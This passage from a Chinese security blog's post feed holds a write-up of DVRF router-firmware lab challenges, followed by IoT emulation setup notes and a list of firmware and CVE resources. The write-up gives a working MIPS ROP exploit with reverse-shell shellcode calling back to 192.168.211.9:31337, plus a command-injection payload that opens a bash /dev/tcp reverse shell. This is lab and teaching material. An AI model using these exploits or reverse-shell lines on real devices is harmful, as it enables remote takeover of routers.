</span><br><span class="line">    servaddr.sin_family = AF_INET;</span><br><span class="line">    servaddr.sin_addr.s_addr = htons(INADDR_ANY);</span><br><span class="line">    servaddr.sin_port = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Binding to port %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line"> </span><br><span class="line">    retval = bind(listen_fd, (struct sockaddr *) &amp;servaddr, <span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"><span class="keyword">if</span> (retval == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Error Binding to port %i\n&quot;</span>, atoi(argv[<span class="number">1</span>]));</span><br><span class="line"> <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span>(setsockopt(listen_fd, SOL_SOCKET,SO_REUSEADDR, (<span class="keyword">char</span>*)&amp;option, <span class="keyword">sizeof</span>(option)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Setsockopt failed :(\n&quot;</span>);</span><br><span class="line">close(listen_fd);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    listen(listen_fd, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    comm_fd = accept(listen_fd, (struct sockaddr*) <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line">        bzero(str, <span class="number">500</span>);</span><br><span class="line">write(comm_fd, <span class="string">&quot;Send Me Bytes:&quot;</span>,<span class="number">14</span>);</span><br><span class="line">        read(comm_fd,str,<span class="number">500</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(endstr, <span class="string">&quot;nom nom nom, you sent me %s&quot;</span>, str);</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Sent back - %s&quot;</span>,str);</span><br><span class="line">        write(comm_fd, endstr, <span class="built_in">strlen</span>(endstr)+<span class="number">1</span>);</span><br><span class="line">shutdown(comm_fd, SHUT_RDWR);</span><br><span class="line">shutdown(listen_fd, SHUT_RDWR);</span><br><span class="line">close(comm_fd);</span><br><span class="line">close(listen_fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0x42</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>栈溢出在这句 <code>sprintf(endstr, &quot;nom nom nom, you sent me %s&quot;, str);</code> str 是 socket 传入的数据，长度内容为我们所控制，溢出 padding 为 51 </p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210314175958.png" alt="image-20210314175958380"></p><h3 id="调试方法-1"><a href="#调试方法-1" class="headerlink" title="调试方法"></a>调试方法</h3><p>在 ubuntu 16.04 下 gdb-multiarch <code>target remote :1234</code> 链接上后报错退出，切换到 attify 能继续使用最常规方式调试：qemu-user 模式加 <code>-g</code> 打开调试端口，gdb-multiarch <code>target remote :1234</code> 链接上去。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># terminal 1</span></span><br><span class="line">sudo qemu-mipsel-static -L . -g 1234 -strace ./pwnable/ShellCode_Required/socket_bof 8884</span><br><span class="line"><span class="comment"># terminal 2 gdb-multiarch</span></span><br><span class="line"><span class="built_in">set</span> architecture mips </span><br><span class="line"><span class="built_in">set</span> endian little</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure><p>另外一个调试方法是 qemu system 启动 mips 系统，然后传入一个 gdb-server ，在里面运行程序然后 gdb-server attach 程序，再在外面用 gdb 链接上去。</p><p>attify 里面 gdb 插件是 gef ，用 vmmap 读不出 libc 地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315180459.png" alt="image-20210315180459380"></p><p>曲线救国在 <code>0x00400D34 </code> 打下断点，单步跟进去查看 sprintf 的真实地址，然后再从 <code>./lib/libc.so.0</code> 读取偏移算出基地址</p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315180734.png" alt="image-20210315180734572"></p><p>全部题目用的 libc 都同一个，需要 shellcode 的题目，换下 shellcode 就能通用 exp 。前面 <code>stack_bof_02</code> 是在 ubuntu16 里面的脚本 libc_base 和 attify 不一样要换下基地址。</p><blockquote><p>Stack_bof_02 的 execve(‘/bin/sh’) 能打通</p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315222313.png" alt="image-20210315222312959"></p><p>找一个反弹 shell 的 shellcode 替换，或者将 shell 绑定到某个端口</p><blockquote><p>反弹 shell ：<a href="http://shell-storm.org/shellcode/files/shellcode-860.php">http://shell-storm.org/shellcode/files/shellcode-860.php</a></p><p>绑定 shell ：<a href="http://shell-storm.org/shellcode/files/shellcode-81.php">http://shell-storm.org/shellcode/files/shellcode-81.php</a></p></blockquote><p>绑定 shell 的 shellcode 预期是开在本地的 4919 端口，实际运行后发现并不是，要自己查端口 -。- ，然鹅 nc 连上去后程序会蹦掉。</p><p>反弹 shell 的 shellcode 预编是反弹到 <strong>192.168.1.177:31337</strong> ，要么修改网卡 ip ，要么就改一下 shellcode 传入的 ip </p><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315201159.png" alt="image-20210315201159630"></p><p>将 ip 地址转换成 16 进制</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>(<span class="number">192</span>)<span class="comment">#0xc0</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">168</span>)<span class="comment">#0xa8</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">1</span>)<span class="comment">#0x01</span></span><br><span class="line"><span class="built_in">hex</span>(<span class="number">177</span>)<span class="comment">#0xb1</span></span><br><span class="line"><span class="comment">#192.168.1.177==&gt;0xB101A8C0</span></span><br></pre></td></tr></table></figure><p>编译一下，编译失败看看是不是 binutils 没装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.endian = <span class="string">&quot;little&quot;</span></span><br><span class="line">asm(<span class="string">&quot;li $a1, 0xB101A8C0&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后搜索 <code>\x01\xb1\x05\x3c\xc0\xa8\xa5\x34</code> 替换为自己编译的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">stg3_SC = <span class="string">&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line"><span class="comment">#stg3_SC += &quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;#192.168.1.177</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\xaf\xd3\x09\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><span class="comment">#192.168.211.9</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br></pre></td></tr></table></figure><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;mips&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line"></span><br><span class="line">libc_addr = <span class="number">0x4089b000</span><span class="comment">#0x766e5000</span></span><br><span class="line">sleep = <span class="number">0x0002F2B0</span></span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x2fb10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76714b10:lia0,1</span></span><br><span class="line"><span class="string">   0x76714b14:movet9,s1</span></span><br><span class="line"><span class="string">   0x76714b18:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget2 = <span class="number">0x7730</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766ec730:lwra,40(sp)</span></span><br><span class="line"><span class="string">   0x766ec734:lws3,36(sp)</span></span><br><span class="line"><span class="string">   0x766ec738:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x766ec73c:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x766ec740:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x766ec744:jrra</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget3 = <span class="number">0x20f1c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x76705f1c:movet9,s2</span></span><br><span class="line"><span class="string">   0x76705f20:lwra,36(sp)</span></span><br><span class="line"><span class="string">   0x76705f24:lws2,32(sp)</span></span><br><span class="line"><span class="string">   0x76705f28:lws1,28(sp)</span></span><br><span class="line"><span class="string">   0x76705f2c:lws0,24(sp)</span></span><br><span class="line"><span class="string">   0x76705f30:jrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget4 = <span class="number">0x16dd0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x766fbdd0:addiua0,sp,24</span></span><br><span class="line"><span class="string">   0x766fbdd4 &lt;optarg&gt;:movet9,s0</span></span><br><span class="line"><span class="string">   0x766fbdd8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget5 = <span class="number">0x214a0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">   0x767064a0:movet9,a0</span></span><br><span class="line"><span class="string">   0x767064a4:swv0,24(sp)</span></span><br><span class="line"><span class="string">   0x767064a8:jalrt9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">stg3_SC = <span class="string">&quot;\xff\xff\x04\x28\xa6\x0f\x02\x24\x0c\x09\x09\x01\x11\x11\x04\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xa6\x0f\x02\x24\x0c\x09\x09\x01\xfd\xff\x0c\x24\x27\x20\x80\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x27\x28\x80\x01\xff\xff\x06\x28\x57\x10\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xff\xff\x44\x30\xc9\x0f\x02\x24\x0c\x09\x09\x01\xc9\x0f\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x79\x69\x05\x3c\x01\xff\xa5\x34\x01\x01\xa5\x20&quot;</span></span><br><span class="line"><span class="comment">#stg3_SC += &quot;\xf8\xff\xa5\xaf\x01\xb1\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;#192.168.1.177</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\xaf\xd3\x09\x05\x3c\xc0\xa8\xa5\x34\xfc\xff\xa5\xaf&quot;</span><span class="comment">#192.168.211.9</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa5\x23\xef\xff\x0c\x24\x27\x30\x80\x01\x4a\x10\x02\x24&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x0c\x09\x09\x01\x62\x69\x08\x3c\x2f\x2f\x08\x35\xec\xff\xa8\xaf&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\x73\x68\x08\x3c\x6e\x2f\x08\x35\xf0\xff\xa8\xaf\xff\xff\x07\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf4\xff\xa7\xaf\xfc\xff\xa7\xaf\xec\xff\xa4\x23\xec\xff\xa8\x23&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xf8\xff\xa8\xaf\xf8\xff\xa5\x23\xec\xff\xbd\x27\xff\xff\x06\x28&quot;</span></span><br><span class="line">stg3_SC += <span class="string">&quot;\xab\x0f\x02\x24\x0c\x09\x09\x01&quot;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">51</span></span><br><span class="line">payload += p32(libc_addr+gadget2)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s0</span></span><br><span class="line">payload += p32(libc_addr+gadget3)<span class="comment">#s1</span></span><br><span class="line">payload += p32(libc_addr+sleep)<span class="comment">#s2</span></span><br><span class="line">payload += <span class="string">&quot;bbbb&quot;</span><span class="comment">#s3</span></span><br><span class="line">payload += p32(libc_addr+gadget1)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(libc_addr+gadget5)<span class="comment">#s0</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s1</span></span><br><span class="line">payload += <span class="string">&quot;cccc&quot;</span><span class="comment">#s2</span></span><br><span class="line">payload += p32(libc_addr+gadget4)<span class="comment">#ra</span></span><br><span class="line"><span class="comment">#######</span></span><br><span class="line">payload += <span class="string">&quot;a&quot;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += stg3_SC</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">8882</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Send Me Bytes:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="socket-cmd"><a href="#socket-cmd" class="headerlink" title="socket_cmd"></a>socket_cmd</h2><p>远程命令注入，参考资料看下面：</p><blockquote><p><a href="https://www.yuque.com/bowu/blog/fhhefi">CTF之命令执行绕过总结</a></p><p><a href="https://whoamianony.top/2021/01/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%8F%8D%E5%BC%B9Shell%EF%BC%8C%E7%9C%8B%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%B1%E5%A4%9F%E4%BA%86/">反弹Shell，看这一篇就够了</a></p></blockquote><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315232145.png" alt="image-20210315232145316"></p><h3 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h3><p>依次打开终端运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 0</span></span><br><span class="line">qemu-mipsel-static -L . -strace ./pwnable/ShellCode_Required/socket_cmd 9999</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#terminal 1</span></span><br><span class="line">nc -lvvp 31337</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#tarminal 2</span></span><br><span class="line">nc 127.0.0.1 9999</span><br><span class="line">hacked|`bash -c <span class="string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.211.9/31337 0&gt;&amp;1&quot;</span>`</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/mrskye/Picbed/raw/master/img/20210315233919.png" alt="image-20210315233919821"></p><blockquote><p>是 iot 用户 nc 链接上去程序，程序是用 sudo 起来，所以切换到 root</p></blockquote><h2 id="Uaf-01-amp-heap-overflow"><a href="#Uaf-01-amp-heap-overflow" class="headerlink" title="Uaf_01&amp;heap_overflow"></a>Uaf_01&amp;heap_overflow</h2><p>剩下两题 heap_overflow 和 uaf_01 没有什么思路，都是输入一次然后程序就退出了。</p><p>uaf_01 重新申请相同 0x11 ，就跳转 <code>Awesome</code> 那个分支，但没啥用。</p><p>heap_overflow 有个后门，输入机会只有一次，然后程序就会关掉。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://ctf-wiki.org/pwn/linux/mips/mips_rop/">https://ctf-wiki.org/pwn/linux/mips/mips_rop/</a></p><p><a href="https://xz.aliyun.com/t/1511">https://xz.aliyun.com/t/1511</a></p><p><a href="https://www.cnblogs.com/hac425/p/9416864.html">https://www.cnblogs.com/hac425/p/9416864.html</a></p><p><a href="https://www.anquanke.com/post/id/184718">https://www.anquanke.com/post/id/184718</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 合天 </tag>
            
            <tag> DVRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOT环境配置V2</title>
      <link href="archives/a9578bea/"/>
      <url>archives/a9578bea/</url>
      
        <content type="html"><![CDATA[<h2 id="更新环境原因"><a href="#更新环境原因" class="headerlink" title="更新环境原因"></a>更新环境原因</h2><p>概述 V1版本情况：</p><ul><li>采用一台 ubuntu 1804 配有基本 pwn 工具、qemu static v5.2 、完整版 binwalk 等。承担固件包中单个文件模拟调试任务，以及通过 qemu 模拟异架构系统实现少部分路由器系统模拟。</li><li>采用 attify v3.0 (base ubuntu 18.04) 的 <a href="https://github.com/attify/firmware-analysis-toolkit">firmware-analysis-toolkit</a> 模拟路由器系统</li></ul><p>V1 版本出现几个问题：</p><ul><li><p>首先是个小问题很容易解决，就是用 qemu uesr 模式单文件模拟调试，gdb-multiarch 有时会连不上。查了下资料、问了问师傅推测可能是 gdb 版本问题。</p><p>解决方法换个 ubuntu（16、20）就行了，qemu 都是每个系统的标配。</p></li><li><p>用 ubuntu 1804 qemu system 模式异架构系统，再在 qemu 虚拟机上运行固件。导入固件文件后，启动脚本基本在 <code>/etc/rc.d/init.d</code> </p><blockquote><p><a href="https://blog.csdn.net/cradmin/article/details/2270497">linux /etc/rc.d/目录的详解-cradmin</a></p><p><a href="https://blog.csdn.net/qq_29350001/article/details/51788937">linux /etc/rc.d/目录的详解-聚优致成</a></p></blockquote><p>这种方法能成功跑起来次数不多，但 qemu 使用桥接模式，让 qemu 虚拟机可与宿主机同一网段，方便调试抓包等。</p></li><li><p>当 ubuntu 1804 qemu system 模拟固件不成功，我就会尝试用 attify FAT 模拟，成功率到时挺高的，但由于 FAT 将 firmadyne 全部操作都整合起来，导致难以个性化修改。比较突出就是：</p><ul><li><p>自动生成启动脚本 <code>run.sh</code> 所配置的网络不能与宿主机在同一个网段，而是和 attify 在同一网段，导致如果想抓包，进行整系统测试时，只能在 attify 中完成。</p><blockquote><p>自动生成脚本在 attify 中新建一个网卡 192.168.0.2 ，链接到 qemu 虚拟机中，虚拟机网卡为 192.168.0.1 。attify 访问 192.168.0.1 即访问路由器后台</p></blockquote><p>尝试修改修改 run.sh 的启动模式，将网络模式修改为桥接，手动创建网桥、tap0 网卡等。异架构 debian 可以成功分配到宿主机网段 ip 出网，对于路由器固件就不行，原因未知。</p></li><li><p>firmadyne 是将固件制作成镜像模拟，也就是说 ssh 密码、 root 密码等等都是固件原有的。当模拟起来后，连不上 shell 就别想着查询端口，通过进程查询提供服务的文件 ……</p><p>这个问题解决方法就是放弃 FAT ，自己手工完成 firmadyne 模拟准备工作。解压固件后，将 <code>/etc/shadow</code> 替换一下，然后才制作镜像。问题在于说 attify 在进行解压时连不上 PostgreSQL ，使用 FAT 脚本就能连上。</p></li></ul></li><li><p>在原有 ubuntu 1804 上搭建 firmadyne ，可能安装脚本部分东西与原有环境有冲突装不上。firmadyne 的 docker 版本没有尝试过。</p></li></ul><p>V2 版本设想的几种方案：</p><ol><li>解决 firmadyne 模拟路由器固件桥接网络不成功问题，让路由器与宿主机在同一网段。</li><li>firmadyne docker 不过这个也是要解决网段问题……</li><li>在 ubuntu 1804 上搭 firmadyne ，放弃分配宿主机网段，直接在 ubuntu 里完成工作</li></ol><p>存一下参考文章</p><ul><li><p>解决出网问题</p><p><a href="https://wzt.ac.cn/2020/01/08/iot_brief/">firmadyne 简单使用指南 &amp; 模拟示例</a></p><p><a href="https://wzt.ac.cn/2019/09/10/QEMU-networking/">QEMU 网络配置一把梭</a></p></li><li><p>将 firmadyne 部署在云端</p><p><a href="https://zhuanlan.zhihu.com/p/110806057">Firmadyne的固件模拟环境搭建(超详细)</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> firmadyne </tag>
            
            <tag> attify </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器资源整理</title>
      <link href="archives/e244711/"/>
      <url>archives/e244711/</url>
      
        <content type="html"><![CDATA[<h2 id="固件下载"><a href="#固件下载" class="headerlink" title="固件下载"></a>固件下载</h2><h3 id="Dlink"><a href="#Dlink" class="headerlink" title="Dlink"></a>Dlink</h3><p>  • 国内：<a href="http://support.dlink.com.cn:9000/">http://support.dlink.com.cn:9000/</a><br>  • 台湾/香港：<a href="http://www.dlinktw.com.tw/techsupport">http://www.dlinktw.com.tw/techsupport</a><br>  • 老旧设备资源（均为US版）：<a href="https://legacy.us.dlink.com/">https://legacy.us.dlink.com/</a></p><h2 id="CVE-仓库"><a href="#CVE-仓库" class="headerlink" title="CVE 仓库"></a>CVE 仓库</h2><p>  • <a href="https://github.com/PAGalaxyLab/VulInfo">https://github.com/PAGalaxyLab/VulInfo</a><br>  • <a href="https://github.com/GD008/vuln">https://github.com/GD008/vuln</a></p><h2 id="厂商安全公告"><a href="#厂商安全公告" class="headerlink" title="厂商安全公告"></a>厂商安全公告</h2><p>  • Dlink：<a href="http://forums.dlink.com/index.php?board=528.0">http://forums.dlink.com/index.php?board=528.0</a><br>      含有 patch 版本下载</p><h2 id="漏洞披露平台"><a href="#漏洞披露平台" class="headerlink" title="漏洞披露平台"></a>漏洞披露平台</h2><p>​    • <a href="https://www.cnvd.org.cn/flaw/list.htm">https://www.cnvd.org.cn/flaw/list.htm</a></p><h2 id="学习文档"><a href="#学习文档" class="headerlink" title="学习文档"></a>学习文档</h2><h3 id="总结性-WIKI"><a href="#总结性-WIKI" class="headerlink" title="总结性 WIKI"></a>总结性 WIKI</h3><p>  • 伏宸安全物联网安全百科：<a href="https://github.com/yaseng/iot-security-wiki">https://github.com/yaseng/iot-security-wiki</a><br>  • Tide安全Iot物联网安全wiki：<a href="https://www.yuque.com/tidesec/iot">https://www.yuque.com/tidesec/iot</a><br>  • 海特实验室IOTWIKI：<a href="https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki">https://github.com/DasSecurity-HatLab/HatLab_IOT_Wiki</a><br>  • 绿盟智能设备安全分析手册：<a href="https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html">https://book.yunzhan365.com/tkgd/lzkp/mobile/index.html</a></p><h3 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h3><p><a href="https://www.anquanke.com/post/id/202965">MIPS 指令集 Shellcode 编写入门</a></p><h2 id="工具相关"><a href="#工具相关" class="headerlink" title="工具相关"></a>工具相关</h2><p>  • 各种架构 gdbserver ：<a href="https://github.com/rapid7/embedded-tools">https://github.com/rapid7/embedded-tools</a></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
          <category> 资料 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-5767 栈溢出漏洞复现</title>
      <link href="archives/266/"/>
      <url>archives/266/</url>
      
